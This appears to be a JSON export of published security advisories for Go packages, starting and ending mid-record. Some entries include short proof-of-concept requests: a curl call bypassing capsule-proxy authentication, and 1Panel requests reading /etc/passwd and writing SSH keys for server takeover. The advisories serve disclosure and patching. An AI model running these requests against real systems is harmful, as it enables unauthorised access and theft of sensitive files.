default\n\n```yaml\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n  kubeadmConfigPatches:\n  - |\n    kind: ClusterConfiguration\n    apiServer:\n        extraArgs:\n          anonymous-auth: \"false\"\n```\n\nInstall `capsule` and `capsule-proxy`\n\n```\nk port-forward svc/capsule-proxy 9001    \nForwarding from 127.0.0.1:9001 -> 9001\nForwarding from [::1]:9001 -> 9001\nHandling connection for 9001\n```\n\nThen query the proxy\n```\ncurl -g -k -H 'Authorization: Bearer   f' -X 'GET' 'https://localhost:9001/api/v1/namespaces'\n```\n\n# Impact\n\nThe whole cluster is exposed to unauthorised users.\n\nThis privilege escalation cannot be exploited if you're relying only on client certificates (SSL/TLS).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/projectcapsule/capsule-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.4.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/clastix/capsule-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.4.5"}}], "references": [{"type": "WEB", "url": "https://github.com/projectcapsule/capsule-proxy/security/advisories/GHSA-fpvw-6m5v-hqfp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-48312"}, {"type": "WEB", "url": "https://github.com/projectcapsule/capsule-proxy/commit/472404f7006a4152e4eec76dee07324dd1e6e823"}, {"type": "PACKAGE", "url": "https://github.com/projectcapsule/capsule-proxy"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-11-24T16:53:25Z", "nvd_published_at": "2023-11-24T18:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hq6q-c2x6-hmch", "modified": "2023-11-30T15:50:15Z", "published": "2023-11-14T21:31:03Z", "aliases": ["CVE-2023-5528"], "summary": "Kubernetes Improper Input Validation vulnerability", "details": "A security issue was discovered in Kubernetes where a user that can create pods and persistent volumes on Windows nodes may be able to escalate to admin privileges on those nodes. Kubernetes clusters are only affected if they are using an in-tree storage plugin for Windows nodes.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.28.0"}, {"fixed": "1.28.4"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.27.0"}, {"fixed": "1.27.8"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.26.0"}, {"fixed": "1.26.11"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.25.16"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5528"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/121879"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/121881"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/121882"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/121883"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/121884"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/121885"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/SL_d4NR8pzA"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3JH444PWZBINXLLFV7XLIJIZJHSK6UEZ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4XZIX727JIKF5RQW7RVVBLWXBCDIBJA7/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7MPGMITSZXUCAVO7Q75675SOLXC2XXU4/"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-14T22:25:07Z", "nvd_published_at": "2023-11-14T21:15:14Z"}}, {"schema_version": "1.4.0", "id": "GHSA-876p-8259-xjgg", "modified": "2023-09-11T18:32:44Z", "published": "2023-08-09T13:18:18Z", "aliases": ["CVE-2023-39533"], "summary": "libp2p nodes vulnerable to attack using large RSA keys", "details": "### Impact\nA malicious peer can use large RSA keys to run a resource exhaustion attack & force a node to spend time doing signature verification of the large key. This vulnerability is present in the core/crypto module of go-libp2p and can occur during the Noise handshake and the libp2p x509 extension verification step.\nTo prevent this attack, go-libp2p now restricts RSA keys to <= 8192 bits.\n\n### Patches\nUsers should upgrade their go-libp2p versions to >=v0.27.8, >= v0.28.2, or >=v0.29.1\nTo protect your application, it's necessary to update to these patch releases **AND** to use the updated Go compiler (1.20.7 or 1.19.12, respectively)\n\n### Workarounds\nThere are no known workarounds\n\n### References\nThe Golang crypto/tls package also had this vulnerability (\"verifying certificate chains containing large RSA keys is slow\u201d https://github.com/golang/go/issues/61460)\nFix in golang/go crypto/tls: https://github.com/golang/go/commit/2350afd2e8ab054390e284c95d5b089c142db017\nFix in quic-go https://github.com/quic-go/quic-go/pull/4012\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/libp2p/go-libp2p"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.27.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/libp2p/go-libp2p"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.28.0"}, {"fixed": "0.28.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/libp2p/go-libp2p"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.29.0"}, {"fixed": "0.29.1"}]}], "versions": ["0.29.0"]}], "references": [{"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/security/advisories/GHSA-876p-8259-xjgg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39533"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/61460"}, {"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/pull/2454"}, {"type": "WEB", "url": "https://github.com/quic-go/quic-go/pull/4012"}, {"type": "WEB", "url": "https://github.com/golang/go/commit/2350afd2e8ab054390e284c95d5b089c142db017"}, {"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/commit/0cce607219f3710addc7e18672cffd1f1d912fbb"}, {"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/commit/445be526aea4ee0b1fa5388aa65d32b2816d3a00"}, {"type": "WEB", "url": "https://github.com/libp2p/go-libp2p/commit/e30fcf7dfd4715ed89a5e68d7a4f774d3b9aa92d"}, {"type": "PACKAGE", "url": "https://github.com/libp2p/go-libp2p"}, {"type": "WEB", "url": "https://go.dev/issue/61460"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-09T13:18:18Z", "nvd_published_at": "2023-08-08T19:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v9vc-7x69-c2x8", "modified": "2023-08-03T16:42:28Z", "published": "2023-08-03T06:30:22Z", "aliases": ["CVE-2023-4124"], "summary": "Answer Missing Authorization vulnerability", "details": "Missing Authorization in GitHub repository answerdev/answer prior to v1.1.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4124"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/964195fd859ee5d7171fac847374dfa31893e793"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/2c684f99-d181-4106-8ee2-64a76ae6a348"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-03T16:42:28Z", "nvd_published_at": "2023-08-03T04:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ch6w-mc6c-g65g", "modified": "2023-08-22T18:09:10Z", "published": "2023-08-21T18:31:23Z", "withdrawn": "2023-08-22T18:09:10Z", "aliases": [], "summary": "Duplicate Advisory: weaviate denial of service vulnerability", "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-8697-479h-5mfp. This link is maintained to preserve external references.\n\n## Original Description\nAn issue in weaviate v.1.20.0 allows a remote attacker to cause a denial of service via the `handleUnbatchedGraphQLRequest` function.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/weaviate/weaviate"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.20.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-38976"}, {"type": "WEB", "url": "https://github.com/weaviate/weaviate/issues/3258"}, {"type": "PACKAGE", "url": "https://github.com/weaviate/weaviate"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-21T20:41:45Z", "nvd_published_at": "2023-08-21T17:15:48Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pv7q-v9mv-9mh5", "modified": "2023-08-10T20:09:07Z", "published": "2023-08-10T20:09:07Z", "aliases": ["CVE-2023-39964"], "summary": "1Panel O&M management panel has a background arbitrary file reading vulnerability", "details": "### Summary\nArbitrary file reads allow an attacker to read arbitrary important configuration files on the server.\n\n### Details\nIn the api/v1/file.go file, there is a function called LoadFromFile, which directly reads the file by obtaining the requested path parameter[path]. The request parameters are not filtered, resulting in a background arbitrary file reading vulnerability\n![picture1](https://user-images.githubusercontent.com/136411443/257109786-1b0af1e7-346f-4e92-9da2-d977f2f7fe6a.jpg)\n\n### PoC\nRequest /api/v1/files/loadfile, carry /etc/passwd data to read, as shown below:\n![\u5fae\u4fe1\u56fe\u7247_20230731112833](https://user-images.githubusercontent.com/136411443/257109931-108fc16f-e180-4d1e-996c-d9da5f76559f.png)\n\n\n### Impact\n1Panel v1.4.3\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/1Panel-dev/1Panel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.3"}, {"fixed": "1.5.0"}]}], "versions": ["1.4.3"]}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-pv7q-v9mv-9mh5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39964"}, {"type": "PACKAGE", "url": "https://github.com/1Panel-dev/1Panel"}, {"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/releases/tag/v1.5.0"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-10T20:09:07Z", "nvd_published_at": "2023-08-10T18:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-85cf-gj29-f555", "modified": "2023-08-10T20:09:24Z", "published": "2023-08-10T20:09:24Z", "aliases": ["CVE-2023-39965"], "summary": "1Panel Arbitrary File Download vulnerability", "details": "### Summary\nAny file downloading vulnerability exists in 1Panel backend.\n\n### Details\nAuthenticated attackers can download arbitrary files through the API interface. This code has unauthorized access.\n![image](https://user-images.githubusercontent.com/116613486/257246024-d0e35800-5fd8-4907-8b1b-504afaad859e.png)\n\n### PoC\npayload:\n\nPOST /api/v1/files/download/bypath HTTP/1.1\nHost: ip\nContent-Type: application/json\n\n{\"path\":\"/etc/passwd\"}\n\n![f77959349e96543436eea18283fa75c](https://user-images.githubusercontent.com/116613486/257245459-13f2f31b-fcfe-4a27-ba52-e2f1e5d4d749.png)\n\n\n### Impact\nAttackers can freely download the file content on the target system. This will be caused a large amount of information leakage.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/1Panel-dev/1Panel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.3"}, {"fixed": "1.5.0"}]}], "versions": ["1.4.3"]}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-85cf-gj29-f555"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39965"}, {"type": "PACKAGE", "url": "https://github.com/1Panel-dev/1Panel"}, {"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/releases/tag/v1.5.0"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-10T20:09:24Z", "nvd_published_at": "2023-08-10T18:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-826j-8wp2-4x6q", "modified": "2023-08-25T18:42:53Z", "published": "2023-08-25T18:42:53Z", "aliases": ["CVE-2023-32079"], "summary": "Netmaker Vulnerable to Privilege Escalation From Non Admin To Admin User", "details": "### Impact\nA Mass assignment vulnerability was found allowing a non-admin user to escalate privileges to admin user.\n\n### Patches\nIssue is patched in 0.17.1, and fixed in 0.18.6+.\n\nIf Users are using 0.17.1, they should run \"docker pull gravitl/netmaker:v0.17.1\" and \"docker-compose up -d\". This will switch them to the patched users\n\nIf users are using v0.18.0-0.18.5, they should upgrade to v0.18.6 or later.\n\n### Workarounds\nIf using 0.17.1, can just pull the latest docker image of backend and restart server.\n\n### References\nCredit to Project Discovery, and in particular https://github.com/rootxharsh , https://github.com/iamnoooob, and https://github.com/projectdiscovery", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.18.0"}, {"fixed": "0.18.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gravitl/netmaker/security/advisories/GHSA-826j-8wp2-4x6q"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32079"}, {"type": "PACKAGE", "url": "https://github.com/gravitl/netmaker"}], "database_specific": {"cwe_ids": ["CWE-915"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-25T18:42:53Z", "nvd_published_at": "2023-08-24T23:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3r32-cp7v-5wq4", "modified": "2023-08-30T20:43:00Z", "published": "2023-08-29T00:32:03Z", "aliases": ["CVE-2023-39059"], "summary": "Code injection in ansible semaphore", "details": "An issue in ansible semaphore v.2.8.90 allows a remote attacker to execute arbitrary code via a crafted payload to the extra variables parameter.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ansible-semaphore/semaphore"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "2.8.90"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39059"}, {"type": "WEB", "url": "https://gist.github.com/Alevsk/1757da24c5fb8db735d392fd4146ca3a"}, {"type": "PACKAGE", "url": "https://github.com/ansible-semaphore/semaphore"}, {"type": "WEB", "url": "https://www.alevsk.com/2023/07/a-quick-story-of-security-pitfalls-with-execcommand-in-software-integrations/"}], "database_specific": {"cwe_ids": ["CWE-94"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-30T20:43:00Z", "nvd_published_at": "2023-08-28T22:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xvhg-w6qc-m3qq", "modified": "2023-08-21T19:32:51Z", "published": "2023-08-15T20:08:17Z", "aliases": ["CVE-2023-40023"], "summary": "Yaklang Plugin's Fuzztag Component Allows Unauthorized Local File Reading", "details": "### Impact\n\nThe Yak Engine has been found to contain a local file inclusion (LFI) vulnerability. This vulnerability allows attackers to include files from the server's local file system through the web application. When exploited, this can lead to the unintended exposure of sensitive data, potential remote code execution, or other security breaches. Users utilizing versions of the Yak Engine prior to 1.2.4-sp1 are impacted.\n\n### Patches\n\nThe vulnerability has been addressed and patched. Users are advised to upgrade to Yak Engine version 1.2.4-sp1 immediately. The patch can be viewed and reviewed at this PR: [https://github.com/yaklang/yaklang/pull/295](https://github.com/yaklang/yaklang/pull/295)\uff0c[https://github.com/yaklang/yaklang/pull/296](https://github.com/yaklang/yaklang/pull/296)\n\n### Workarounds\n\nCurrently, the most effective solution is to upgrade to the patched version of Yak Engine (1.2.4-sp1). Users are also advised to avoid exposing vulnerable versions to untrusted input and to closely monitor any unexpected server behavior until they can upgrade.\n\n### References\n\nFor more details on the vulnerability and the corresponding patch, please visit the following link:\n- [PR addressing the LFI vulnerability in Yak Engine](https://github.com/yaklang/yaklang/pull/295)\n- [disable default file fuzztag in fuzz.Pool](https://github.com/yaklang/yaklang/pull/296)\n- [\u5229\u7528yakit\u529f\u80fd\u7279\u6027\u6eaf\u6e90\u653b\u51fb\u8005](https://mp.weixin.qq.com/s?__biz=Mzg5ODE3NTU1OQ==&mid=2247484236&idx=1&sn=ef0c14a89721800b2311d0e487388399)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/yaklang/yaklang"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.4-sp2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/yaklang/yaklang/security/advisories/GHSA-xvhg-w6qc-m3qq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40023"}, {"type": "WEB", "url": "https://github.com/yaklang/yaklang/pull/295"}, {"type": "WEB", "url": "https://github.com/yaklang/yaklang/pull/296"}, {"type": "PACKAGE", "url": "https://github.com/yaklang/yaklang"}, {"type": "WEB", "url": "https://mp.weixin.qq.com/s?__biz=Mzg5ODE3NTU1OQ==&mid=2247484236&idx=1&sn=ef0c14a89721800b2311d0e487388399"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-15T20:08:17Z", "nvd_published_at": "2023-08-14T20:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9rww-66w7-7vjx", "modified": "2023-08-11T21:58:15Z", "published": "2023-08-11T09:30:36Z", "aliases": ["CVE-2023-4108"], "summary": "Mattermost fails to sanitize post metadata", "details": "Mattermost fails to sanitize post metadata during audit logging, resulting in permalinks' contents being logged.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.8.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.9.0"}, {"fixed": "7.9.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.9.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.10.0"}, {"fixed": "7.10.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.10.3"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4108"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-11T21:58:15Z", "nvd_published_at": "2023-08-11T07:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jcf2-mxr2-gmqp", "modified": "2023-08-25T21:35:52Z", "published": "2023-08-25T19:45:57Z", "aliases": ["CVE-2023-40579"], "summary": "OpenFGA Authorization Bypass", "details": "## Overview\nSome end users of OpenFGA v1.3.0 or earlier are vulnerable to authorization bypass when calling the ListObjects API. UPDATE: This means that the API sometimes returns more objects than it should.\n\n## Am I Affected?\n\nThe vulnerability affects customers using `ListObjects` with specific models. The affected models contain expressions of type `rel1 from type1`.\n\n## Fix\nUpdate to v1.3.1.\n\n## Backward Compatibility\nThis update is backward compatible.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openfga/openfga"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/openfga/openfga/security/advisories/GHSA-jcf2-mxr2-gmqp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40579"}, {"type": "PACKAGE", "url": "https://github.com/openfga/openfga"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/releases/tag/v1.3.1"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-25T19:45:57Z", "nvd_published_at": "2023-08-25T20:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j3p8-6mrq-6g7h", "modified": "2023-11-02T21:22:21Z", "published": "2023-08-02T21:30:20Z", "aliases": ["CVE-2023-29407"], "summary": "Golang TIFF decoder vulnerable to excessive CPU consumption", "details": "A maliciously-crafted image can cause excessive CPU consumption in decoding. A tiled image with a height of 0 and a very large width can cause excessive CPU consumption, despite the image size (width * height) appearing to be zero.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/image"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29407"}, {"type": "WEB", "url": "https://go.dev/cl/514897"}, {"type": "WEB", "url": "https://go.dev/issue/61581"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KO54NBDUJXKAZNGCFOEYL2LKK2RQP6K6/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XWH6Q7NVM4MV3GWFEU4PA67AWZHVFJQ2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XZTEP6JYILRBNDTNWTEQ5D4QUUVQBESK/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1990"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230831-0009/"}], "database_specific": {"cwe_ids": ["CWE-834"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-02T21:22:21Z", "nvd_published_at": "2023-08-02T20:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9phh-r37v-34wh", "modified": "2023-08-14T21:10:17Z", "published": "2023-08-14T21:10:17Z", "aliases": [], "summary": "lakeFS vulnerable to Arbitrary JavaScript Injection via Direct Link to HTML Files", "details": "### Impact\nThe browser renders the resulting HTML when opening a direct link to an HTML file via lakeFS. Any JavaScript within that page is executed within the context of the domain lakeFS is running in.  \nAn attacker can inject a malicious script inline, download resources from another domain, or make arbitrary HTTP requests. This would allow the attacker to send information to a random domain or carry out lakeFS operations while impersonating the victim.  \n\nNote that to carry out this attack, an attacker must already have access to upload the malicious HTML file to one or more repositories. It also depends on the victim receiving and opening the link to the malicious HTML file.\n\n### Patches\nThis is fixed in lakeFS version 0.106.0\n\n### Workarounds\nThere are no known workarounds at this time.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/treeverse/lakefs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.106.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/treeverse/lakeFS/security/advisories/GHSA-9phh-r37v-34wh"}, {"type": "WEB", "url": "https://github.com/treeverse/lakeFS/commit/2b2a9fa156ad80b0aac043e17533b546b1800603"}, {"type": "PACKAGE", "url": "https://github.com/treeverse/lakeFS"}, {"type": "WEB", "url": "https://github.com/treeverse/lakeFS/releases/tag/v0.106.0"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-14T21:10:17Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-hf7j-xj3w-87g4", "modified": "2023-08-10T20:09:47Z", "published": "2023-08-10T20:09:47Z", "aliases": ["CVE-2023-39966"], "summary": "1Panel arbitrary file write vulnerability", "details": "# Summary\nAn arbitrary file write vulnerability could lead to direct control of the server\n# Details\n## Arbitrary file creation\nIn the api/v1/file.go file, there is a function called SaveContentthat,It recieves JSON data sent by users in the form of a POST request. And the lack of parameter filtering allows for arbitrary file write operations.It looks like this:\n\n- Vulnerable Code\n\n![\u5fae\u4fe1\u56fe\u7247_20230801092544](https://user-images.githubusercontent.com/136411443/257381095-4d7c014b-b699-4152-8b9d-2cc9399dfd85.png)\n\n# PoC\n\n- We can write the SSH public key into the /etc/.root/authorized_keys configuration file on the server.\n\n![\u5fae\u4fe1\u56fe\u7247_20230801093243](https://user-images.githubusercontent.com/136411443/257381907-38784fab-77b9-47b9-a598-44ef7ad0b65c.png)\n\n- The server was successfully written to the public key\n![\u5fae\u4fe1\u56fe\u7247_20230801093610](https://user-images.githubusercontent.com/136411443/257382468-b4836eee-f751-4b43-93ff-cb39fdc6c809.png)\n\n- Successfully connected to the target server using an SSH private key.\n![\u5fae\u4fe1\u56fe\u7247_20230801093933](https://user-images.githubusercontent.com/136411443/257383031-53f1e5de-2743-48ed-a1cf-9a5ea0c0f90b.png)\n![\u5fae\u4fe1\u56fe\u7247_20230801094037](https://user-images.githubusercontent.com/136411443/257383041-d9f64647-95d9-4711-8b9f-e152966537c9.png)\n\nAs a result, the server is directly controlled, causing serious **harm**\n\n\n# Impact\n1Panel v1.4.3\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/1Panel-dev/1Panel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.3"}, {"fixed": "1.5.0"}]}], "versions": ["1.4.3"]}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-hf7j-xj3w-87g4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39966"}, {"type": "PACKAGE", "url": "https://github.com/1Panel-dev/1Panel"}, {"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/releases/tag/v1.5.0"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-10T20:09:47Z", "nvd_published_at": "2023-08-10T18:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-52h8-c876-989c", "modified": "2023-08-03T16:42:42Z", "published": "2023-08-03T06:30:23Z", "aliases": ["CVE-2023-4127"], "summary": "Answer has Race Condition within a Thread", "details": "Race Condition within a Thread in GitHub repository answerdev/answer prior to v1.1.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4127"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/47661dc8a356ce6aa7793f1bd950399292180182"}, {"type": 